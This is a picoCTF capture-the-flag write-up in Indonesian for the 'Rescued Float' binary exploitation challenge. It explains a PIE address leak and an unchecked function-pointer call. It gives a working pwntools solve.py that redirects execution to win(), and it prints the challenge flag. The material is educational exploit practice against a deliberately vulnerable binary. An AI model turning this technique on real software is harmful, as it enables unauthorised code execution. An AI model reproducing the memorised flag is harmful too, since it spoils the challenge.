# Rescued Float — picoCTF (PWN)

## Deskripsi Challenge

Program binary:

1. Menampilkan alamat `main()`
2. Meminta user memasukkan alamat
3. Melakukan call ke alamat tersebut

Target kita adalah memaksa program memanggil fungsi `win()` untuk membaca flag.

---

## Analisis Kerentanan

Cuplikan fungsi `main()`:

```
scanf("%lx", &v0);
v1 = v0;
v1(v3, v4, v5, v6, v7, v8);
```

Input user dibaca sebagai pointer fungsi dan langsung dieksekusi tanpa validasi.  
Ini memberikan keleluasaan user untuk memilih fungsi mana yang dijalankan.

---

## Proteksi Binary

| Proteksi | Status     |
| -------- | ---------- |
| PIE      | ✔️ Aktif   |
| NX       | ✔️ Aktif   |
| Canary   | ✔️ Ada     |
| ASLR     | ✔️ Efektif |

PIE membuat alamat acak setiap eksekusi, tetapi program membocorkan alamat `main()`,  
sehingga base binary tetap bisa dihitung.

---

## Strategi Eksploitasi

Program memberi leak alamat `main()`.

Hitung:

```
base      = leaked_main - offset(main)
win_addr  = base + offset(win)
```

Kirim `win_addr` sebagai input → program memanggil `win()` → flag dicetak.

---

## solve.py

```python
#!/usr/bin/env python3
from pwn import *

host = "rescued-float.picoctf.net"
port = 52592

elf = ELF("./vuln")
context.binary = elf

io = remote(host, port)

io.recvuntil(b"Address of main: ")
leak = int(io.recvline().strip(), 16)
log.info(f"main leak: {hex(leak)}")

base = leak - elf.symbols['main']
log.info(f"PIE base: {hex(base)}")

win = base + elf.symbols['win']
log.success(f"win @ {hex(win)}")

io.recvuntil(b"=>")
io.sendline(hex(win).encode())

io.interactive()
```

---

## Cara Menjalankan

```
pip install pwntools
./solve.py
```

---

## Output Berhasil

![output](image.png)

picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_6f4e7236}
